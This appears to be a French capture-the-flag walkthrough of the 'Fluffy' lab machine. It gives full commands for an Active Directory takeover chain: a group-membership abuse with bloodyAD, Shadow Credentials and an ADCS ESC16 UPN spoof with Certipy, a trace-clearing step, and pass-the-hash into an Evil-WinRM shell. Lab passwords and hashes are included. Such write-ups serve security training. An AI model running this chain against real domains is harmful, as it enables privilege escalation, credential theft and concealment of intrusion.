01

Manipulation LDAP — BloodyAD

Quand utiliser
Post-Exploitation — BloodHound révèle que p.agila a des droits AddMember sur le groupe "Service Accounts".

Objectif : s'ajouter au groupe Service Accounts pour hériter de ses permissions, notamment GenericWrite sur le compte ca_svc.

⚠️ Synchroniser l'horloge avant toute opération Kerberos : sudo ntpdate -u 10.10.11.69
bash — Ajout au groupe
bloodyAD -u 'p.agila' -p 'prometheusx-303' -d fluffy.htb \
  --host 10.10.11.69 add groupMember 'service accounts' p.agila
# → p.agila membre de "Service Accounts" → hérite GenericWrite sur ca_svc
02

Shadow Credentials — Certipy

Quand utiliser
On a GenericWrite sur ca_svc mais on ne veut pas changer son mot de passe (risque de casser la prod). Shadow Credentials permet d'obtenir le hash NT sans modifier le mot de passe.

L'attaque Shadow Credentials abuse de l'attribut msDS-KeyCredentialLink pour injecter un certificat et récupérer le hash NT via PKINIT.

bash — Shadow Credentials auto
certipy-ad shadow auto \
  -username 'p.agila@fluffy.htb' \
  -password 'prometheusx-303' \
  -account ca_svc \
  -dc-ip 10.10.11.69
# → Hash NT ca_svc : ca0f4f9e9eb8a092addf53bb03fc98c8
03

ADCS ESC16 — UPN Spoofing

ESC16 : le serveur ADCS ne valide pas strictement l'UPN (User Principal Name). On modifie l'UPN de ca_svc (qu'on contrôle) pour usurper l'identité de l'Administrator, puis on demande un certificat.

A. Modification UPN (Spoofing)

bash — Changer l'UPN de ca_svc → administrator
certipy-ad account update \
  -username "p.agila@fluffy.htb" \
  -p "prometheusx-303" \
  -user ca_svc \
  -upn 'administrator' \
  -dc-ip 10.10.11.69

B. Demande de certificat (Forged Identity)

bash — Obtenir le certificat Administrator
certipy-ad req \
  -u 'ca_svc' \
  -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 \
  -dc-ip 10.10.11.69 \
  -target dc01.fluffy.htb \
  -ca fluffy-DC01-CA \
  -template User
# → Certificat "administrator.pfx" créé

C. Nettoyage — Restauration UPN

bash — Effacer les traces
certipy-ad account update \
  -username "p.agila@fluffy.htb" \
  -p "prometheusx-303" \
  -user ca_svc \
  -upn 'ca_svc@fluffy.htb' \
  -dc-ip 10.10.11.69
04

Accès Final — Pass-The-Hash

bash — Extraction hash NT Administrator
certipy-ad auth \
  -pfx administrator.pfx \
  -domain fluffy.htb \
  -dc-ip 10.10.11.69
# → Hash NT Administrator : [HASH_NT_ADMIN]
bash — Shell via Evil-WinRM
evil-winrm -u Administrator -H [HASH_NT_ADMIN] -i 10.10.11.69
# → *Evil-WinRM* PS C:\Users\Administrator\Desktop>
